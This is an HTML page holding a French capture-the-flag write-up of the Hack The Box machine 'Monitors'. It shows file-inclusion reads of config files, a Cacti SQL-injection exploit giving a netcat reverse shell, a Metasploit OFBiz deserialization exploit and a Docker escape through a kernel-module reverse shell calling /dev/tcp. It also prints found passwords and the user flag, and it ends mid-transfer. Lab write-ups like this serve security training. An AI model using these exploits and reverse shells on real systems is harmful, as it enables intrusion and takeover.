@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>[HTB - Hard] Monitors</title>
+    <meta name="description" content="Writeup by jsthope">
+    <meta name="keywords" content='jsthope, jsthop3, hope1010, htb, hackthebox, rootme, writeup, walkthrough, hack, hacking, pwn, blog, fr, francais, french, correction, HTB, Hard, Writeup, French, Wordpress'>
+
+    <meta property="og:url" content="https://jsthope.xyz/posts/monitors/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="[HTB - Hard] Monitors">
+    <meta property="og:description" content="Writeup by jsthope">
+    <meta property="og:image" content="https://jsthope.xyz/images/monitors/monitors.png">
+    <meta property="og:image:secure_url" content="https://jsthope.xyz/images/monitors/monitors.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="[HTB - Hard] Monitors">
+    <meta name="twitter:description" content="Writeup by jsthope">
+    <meta property="twitter:domain" content="https://jsthope.xyz/posts/monitors/">
+    <meta property="twitter:url" content="https://jsthope.xyz/posts/monitors/">
+    <meta name="twitter:image" content="https://jsthope.xyz/images/monitors/monitors.png">
+
+    
+    <link rel="canonical" href="https://jsthope.xyz/posts/monitors/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.7c4d836d7c9c27452a883b40f29a57af928d9532635f0e5254738080cc8c5d29.js" integrity="sha256-fE2DbXycJ0UqiDtA8ppXr5KNlTJjXw5SVHOAgMyMXSk="></script>
+
+    
+    
+    <script async src="https://analytics.umami.is/script.js" data-website-id="fe709d70-9350-43d6-be51-e47a32a05779"></script>
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://jsthope.xyz/">
+                <img src="https://jsthope.xyz/images/avatar.png" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://jsthope.xyz/">jsthope</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://jsthope.xyz/posts/"> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://jsthope.xyz/tags/"> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/JstHope"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://jsthope.xyz/posts/"> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://jsthope.xyz/tags/"> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/JstHope"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>[HTB - Hard] Monitors</h1>
+        <small role="doc-subtitle">Writeup by jsthope</small>
+        <p class="post-date">
+            September 9, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/htb">HTB</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/hard">Hard</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/writeup">Writeup</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/french">French</a></li>
+        
+            <li class="post-tag"><a href="https://jsthope.xyz/tags/wordpress">Wordpress</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p><img src="/images/monitors/monitors.png" alt="HTB Monitors Image"></p>
+<h1 id="marcus">Marcus</h1>
+<h2 id="nmap">Nmap</h2>
+<p>On commence par scanner les ports de l&rsquo;ip:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -A 10.10.10.238
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bacccd81fc9155f3f6a91f4ee8bee52e (RSA)
+|   256 6943376a1809f5e77a67b81811ead765 (ECDSA)
+|_  256 5d5e3f67ef7d762315114b53f8413a94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: WordPress 5.5.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   23.69 ms 10.10.14.1
+2   25.52 ms monitors.htb (10.10.10.238)
+</code></pre><h2 id="hosts">Hosts</h2>
+<p>On ajoute ensuite le domain aux hosts:</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/home/kali]
+└─# echo &#34;10.10.10.238 monitors.htb&#34; &gt;&gt; /etc/hosts
+</code></pre><h2 id="wordpress">Wordpress</h2>
+<p>Nmap nous a montré que le site utilise WordPress 5.5.1,
+on va donc scanner ce site Wordpress à l&rsquo;aide de wpscan:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ sudo wpscan --url http://monitors.htb -e ap,t,tt,u --api-token TOKEN
+[...]
+[i] Plugin(s) Identified:
+
+[+] wp-with-spritz
+ | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2015-08-20T20:15:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | [!] 1 vulnerability identified:
+ |
+ | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion
+ |     References:
+ |      - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8
+ |      - https://www.exploit-db.com/exploits/44544/
+ |
+ | Version: 4.2.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
+[...]
+</code></pre><h2 id="wordpress-rfi">Wordpress RFI</h2>
+<p>Wpscan nous dit que la version du plugin <code>wp-with-spritz</code> est vulnérable à un RFI:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ locate 44544                       
+/usr/share/exploitdb/exploits/php/webapps/44544.php
+          
+┌──(kali㉿kali)-[~]
+└─$ cat /usr/share/exploitdb/exploits/php/webapps/44544.php                                  
+# Exploit Title: WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion
+# Date: 2018-04-25
+# Exploit Author: Wadeek
+# Software Link: https://downloads.wordpress.org/plugin/wp-with-spritz.zip
+# Software Version: 1.0
+# Google Dork: intitle:(&#34;Spritz Login Success&#34;) AND inurl:(&#34;wp-with-spritz/wp.spritz.login.success.html&#34;)
+# Tested on: Apache2 with PHP 7 on Linux
+# Category: webapps
+
+
+1. Version Disclosure
+
+/wp-content/plugins/wp-with-spritz/readme.txt
+
+2. Source Code
+
+if(isset($_GET[&#39;url&#39;])){
+$content=file_get_contents($_GET[&#39;url&#39;]);
+
+3. Proof of Concept
+
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec                                                                                  
+</code></pre><p>Ainsi, allons voir la configuration d&rsquo;apache:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/000-default.conf
+# Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf
+
+&lt;VirtualHost *:80&gt;
+[...]
+</code></pre><p>On trouve alors un nouveau domain à ajouter:</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/home/kali]
+└─# echo &#34;10.10.10.238 cacti-admin.monitors.htb&#34; &gt;&gt; /etc/hosts
+</code></pre><p>La configuration de monitors.htb nous montre que la racine des fichiers du site est <code>/var/www/wordpress</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/monitors.htb.conf 
+[...]
+        ServerAdmin admin@monitors.htb
+        ServerName monitors.htb
+        ServerAlias monitors.htb
+        DocumentRoot /var/www/wordpress
+[...]
+</code></pre><p>Puis le fichier de configuration de Wordpress <code>wp-config.php</code>, nous donne le mot de passe de la database:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../var/www/wordpress/wp-config.php
+
+define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );
+
+/** MySQL database username */
+define( &#39;DB_USER&#39;, &#39;wpadmin&#39; );
+
+/** MySQL database password */
+define( &#39;DB_PASSWORD&#39;, &#39;BestAdministrator@2020!&#39; );
+</code></pre><h2 id="cacti">Cacti</h2>
+<p>Allons maintenant sur le nouveau site qu&rsquo;on a trouvé:
+<img src="/images/monitors/cacti.png" alt="cacti"></p>
+<p>Ce site utilise donc <code>cacti 1.2.12</code>. Cherchons si des exploits sont connus pour cette version:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit cacti 1.2.12
+------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                    |  Path
+------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Cacti 1.2.12 - &#39;filter&#39; SQL Injection                                                                             | php/webapps/49810.py
+------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+
+┌──(kali㉿kali)-[~]
+└─$ locate php/webapps/49810.py        
+/usr/share/exploitdb/exploits/php/webapps/49810.py
+
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49810.py
+usage: 49810.py [-h] -t &lt;target/host URL&gt; -u &lt;user&gt; -p &lt;password&gt; --lhost &lt;lhost&gt; --lport &lt;lport&gt;
+49810.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
+</code></pre><p>Il nous faut un mot de passe, si on essaye avec <code>admin:BestAdministrator@2020!</code> ca marche.
+L&rsquo;exploit obtient une RCE grace à une SQLi:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop]
+└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.5 --lport 4444 
+[+] Connecting to the server...
+[+] Retrieving CSRF token...
+[+] Got CSRF token: sid:cd05039fb335b6d5cbf9fcecc77db39a5d777669,1694259967
+[+] Trying to log in...
+[+] Successfully logged in!
+
+[+] SQL Injection:
+&#34;name&#34;,&#34;hex&#34;
+&#34;&#34;,&#34;&#34;
+&#34;admin&#34;,&#34;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&#34;
+&#34;guest&#34;,&#34;43e9a4ab75570f5b&#34;
+
+[+] Check your nc listener!
+</code></pre><p>Le revshell a bien fonctionné et notre netcat nous montre qu&rsquo;on est connecté à <code>www-data</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.238] 33632
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>A ce stade là, j&rsquo;utilise toujours cette commande pour upgrade mon shell (même que dans ce cas là c&rsquo;est probablement inutile):</p>
+<pre tabindex="0"><code>$ python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
+</code></pre><h2 id="www-data---marcus">www-data -&gt; marcus</h2>
+<p>Regardons les références à l&rsquo;utilisateur <code>marcus</code>:</p>
+<pre tabindex="0"><code>$ grep &#39;marcus&#39; /etc -R 2&gt;/dev/null
+grep &#39;marcus&#39; /etc -R 2&gt;/dev/null
+/etc/group-:marcus:x:1000:
+/etc/subgid:marcus:165536:65536
+/etc/group:marcus:x:1000:
+/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
+/etc/subuid:marcus:165536:65536
+/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+
+$ cat /home/marcus/.backup/backup.sh
+cat /home/marcus/.backup/backup.sh                                                                                                                  
+#!/bin/bash                                                                                                                                         
+                                                                                                                                                    
+backup_name=&#34;cacti_backup&#34;                                                                                                                          
+config_pass=&#34;VerticalEdge2020&#34;
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p &#34;${config_pass}&#34; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip
+</code></pre><p>On obtient alors un nouveau mot de passe <code>VerticalEdge2020</code>.</p>
+<h1 id="root">Root</h1>
+<p>Avec celui-ci, on se connecte au ssh de marcus:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ssh marcus@monitors.htb    
+marcus@monitors:~$
+</code></pre><p>On obtient au passage le flag utilisateur:</p>
+<pre tabindex="0"><code>marcus@monitors:~$ cat user.txt 
+5bb7d47702797743d59aa6384da443ea
+</code></pre><h2 id="linpeassh">linpeas.sh</h2>
+<p>On cherche maintenant à faire une escalade de privilège jusqu&rsquo;à <code>root</code>, pour se faire, on va utiliser <code>linpeas.sh</code> pour lister les informations intéressantes.</p>
+<p>Ni curl ni wget ne sont disponible, donc on ne va pas passer par http pour envoyé des fichiers mais utiliser netcat car lui est disponible:</p>
+<pre tabindex="0"><code># Cible:
+$ nc -l -p 1234 &gt; linpeas.sh
+nc -l -p 1234 &gt; linpeas.sh
+</code></pre><pre tabindex="0"><code># Kali:
+┌──(kali㉿kali)-[~/Desktop/linpeas-server]
+└─$ nc -w 3 10.10.10.238 1234 &lt; linpeas.sh
+</code></pre><p>On execute linpeas:</p>
+<pre tabindex="0"><code>$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+$ ./linpeas.sh
+</code></pre><p>Linpeas nous montre les ports utilisés en local:</p>
+<pre tabindex="0"><code>╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                                                                                                                                                           
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+</code></pre><h2 id="tunnel-chisel">Tunnel (Chisel)</h2>
+<p>Le service <code>127.0.0.1:8443</code> retient mon attention,
+on va alors setup un proxy pour pouvoir acceder au reseau local:</p>
+<pre tabindex="0"><code>marcus@monitors:~$ nc -l -p 1234 &gt; chisel
+marcus@monitors:~$ chmod +x chisel
+marcus@monitors:~$ ./chisel client 10.10.14.5:8000 R:8443:127.0.0.1:1080
+</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/linpeas-server]
+└─$ ./chisel server -p 8000 --reverse
+2023/09/09 17:23:05 server: Reverse tunnelling enabled
+2023/09/09 17:23:05 server: Fingerprint byl8Mf/Bu9BZsKH8mG4H4E3zwSd50oTi+HL4CEFwWc8=
+2023/09/09 17:23:05 server: Listening on http://0.0.0.0:8000
+2023/09/09 17:23:05 server: session#1: tun: proxy#R:8443=&gt;8443: Listening
+</code></pre><p>Chisel nous a alors fait un tunnel pour accédé à <code>https://localhost:8443/</code> sur notre propre machine:
+<img src="/images/monitors/tomcat.png" alt="tomcat"></p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/linpeas-server]
+└─$ dirsearch -u &#34;https://localhost:8443/&#34;
+</code></pre><p><code>dirsearch</code> nous montre que <code>https://localhost:8443/solr/</code> existe.</p>
+<p>Avec une recherche rapide on tombe sur:
+<img src="/images/monitors/solr.png" alt="solr"></p>
+<h2 id="ofbiz-exploit">ofbiz exploit</h2>
+<p>On trouve alors que <code>https://localhost:8443/solr/#/</code> redirection vers <code>https://localhost:8443/solr/control/checkLogin/#/</code>:
+<img src="/images/monitors/ofbiz.png" alt="ofbiz">
+Ce service utilise <code>ofbiz 17.12.01</code>.</p>
+<h3 id="searchsploit">Searchsploit</h3>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ searchsploit ofbiz                      
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                            |  Path
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Apache OFBiz - Admin Creator                                                                                                              | multiple/remote/12264.txt
+Apache OFBiz - Multiple Cross-Site Scripting Vulnerabilities                                                                              | php/webapps/12330.txt
+Apache OFBiz - Remote Execution (via SQL Execution)                                                                                       | multiple/remote/12263.txt
+Apache OFBiz 10.4.x - Multiple Cross-Site Scripting Vulnerabilities                                                                       | multiple/remote/38230.txt
+Apache OFBiz 16.11.04 - XML External Entity Injection                                                                                     | java/webapps/45673.py
+Apache OFBiz 16.11.05 - Cross-Site Scripting                                                                                              | multiple/webapps/45975.txt
+Apache OFBiz 17.12.03 - Cross-Site Request Forgery (Account Takeover)                                                                     | java/webapps/48408.txt
+ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                     | java/webapps/50178.sh
+------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre><h3 id="metasploit">Metasploit</h3>
+<p>L&rsquo;exploit trouvé avec <code>searchsploit</code> ne marche pas. Je vais alors chercher dans <code>Metasploit</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop]
+└─$ msfconsole                          
+msf6 &gt; search ofbiz
+
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank       Check  Description
+   -  ----                                                  ---------------  ----       -----  -----------
+   0  exploit/linux/http/apache_ofbiz_deserialization_soap  2021-03-22       excellent  Yes    Apache OFBiz SOAP Java Deserialization
+   1  exploit/linux/http/apache_ofbiz_deserialization       2020-07-13       excellent  Yes    Apache OFBiz XML-RPC Java Deserialization
+   2  auxiliary/scanner/http/log4shell_scanner              2021-12-09       normal     No     Log4Shell HTTP Scanner
+</code></pre><p>Utilisons <code>Apache OFBiz XML-RPC Java Deserialization</code>:</p>
+<pre tabindex="0"><code>msf6 &gt; use 1
+[*] Using configured payload linux/x64/meterpreter_reverse_https
+</code></pre><p>Après configuration j&rsquo;ai:</p>
+<pre tabindex="0"><code>msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; show options
+
+Module options (exploit/linux/http/apache_ofbiz_deserialization):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     127.0.0.1        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      8443             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addres
+                                         ses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        true             no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter_reverse_https):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.5       yes       The local listener hostname
+   LPORT  4444             yes       The local listener port
+   LURI                    no        The HTTP Path
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Linux Dropper
+</code></pre><p>Plus qu&rsquo;à l&rsquo;executer:</p>
+<pre tabindex="0"><code>msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run
+[*] Started HTTPS reverse handler on https://10.10.14.5:4444
+[*] Running automatic check (&#34;set AutoCheck false&#34; to disable)
+[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. Target cannot deserialize arbitrary data. &#34;set ForceExploit true&#34; to override check result.
+[*] Exploit completed, but no session was created.
+msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; set ForceExploit true
+ForceExploit =&gt; true
+msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run
+</code></pre><h1 id="docker">Docker</h1>
+<p>A ce stade, on voit qu&rsquo;on se trouve dans un docker compose:</p>
+<pre tabindex="0"><code>meterpreter &gt; cat /proc/1/cgroup
+12:pids:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+11:cpuset:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+10:hugetlb:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+9:devices:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+8:blkio:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+7:cpu,cpuacct:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+6:freezer:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+5:net_cls,net_prio:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+4:perf_event:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+3:rdma:/
+2:memory:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+1:name=systemd:/docker/69506ef7a41b39b56262c2f634281cffb6792b0be677ee04c6a3fac480a0983b
+0::/system.slice/containerd.service
+</code></pre><p>On va revenir à un shell:</p>
+<pre tabindex="0"><code>meterpreter &gt; shell
+Process 203 created.
+Channel 4 created.
+</code></pre><p>On découvre qu&rsquo;on est bien root. Le but est maintenant de sortir du docker compose</p>
+<pre tabindex="0"><code>id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><h2 id="docker-escape">Docker Escape</h2>
+<p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation">Hacktricks</a> nous suggère de chercher des vulnérabilités de capabilities:</p>
+<pre tabindex="0"><code>capsh --print
+
+Terminate channel 4? [y/N]  N                                                                                                                                               
+Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip                                                                                                                                         
+Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+Securebits: 00/0x0/1&#39;b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=
+</code></pre><p>On voit ici que <code>cap_sys_module</code> peut etre exploité. (cf Hacktricks)</p>
+<p>Avec un peu de recherche, je tombe sur ce poste: <a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></p>
+<p>On créé donc les deux fichiers présentés dans le post:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//reverse-shell.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kmod.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+</span></span><span style="display:flex;"><span>MODULE_AUTHOR(<span style="color:#e6db74">&#34;AttackDefense&#34;</span>);
+</span></span><span style="display:flex;"><span>MODULE_DESCRIPTION(<span style="color:#e6db74">&#34;LKM reverse shell module&#34;</span>);
+</span></span><span style="display:flex;"><span>MODULE_VERSION(<span style="color:#e6db74">&#34;1.0&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.5/4445 0&gt;&amp;1&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>, NULL };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// call_usermodehelper function is used to create user mode processes from kernel space
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> __init <span style="color:#a6e22e">reverse_shell_init</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> call_usermodehelper(argv[<span style="color:#ae81ff">0</span>], argv, envp, UMH_WAIT_EXEC);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> __exit <span style="color:#a6e22e">reverse_shell_exit</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    printk(KERN_INFO <span style="color:#e6db74">&#34;Exiting</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>module_init(reverse_shell_init);
+</span></span><span style="display:flex;"><span>module_exit(reverse_shell_exit);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Makefile" data-lang="Makefile"><span style="display:flex;"><span><span style="color:#75715e">#Makefile
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>obj-m <span style="color:#f92672">+=</span>reverse-shell.o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">all</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	make -C /lib/modules/4.15.0-142-generic/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> modules
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">clean</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	make -C /lib/modules/4.15.0-142-generic/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> clean
+</span></span></code></pre></div><p>Puis on les télécharge sur la cible:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Desktop/linpeas-server]
+└─$ python2 -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+</code></pre><pre tabindex="0"><code>wget 10.10.14.5/reverse-shell.c
+--2023-09-09 17:13:13--  http://10.10.14.5/reverse-shell.c
+Connecting to 10.10.14.5:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 616 [text/plain]
+Saving to: ‘reverse-shell.c’
+
+     0K                                                       100% 50.2M=0s
+
+2023-09-09 17:13:13 (50.2 MB/s) - ‘reverse-shell.c’ saved [616/616]
+</code></pre><pre tabindex="0"><code>wget 10.10.14.5/Makefile
+connected.
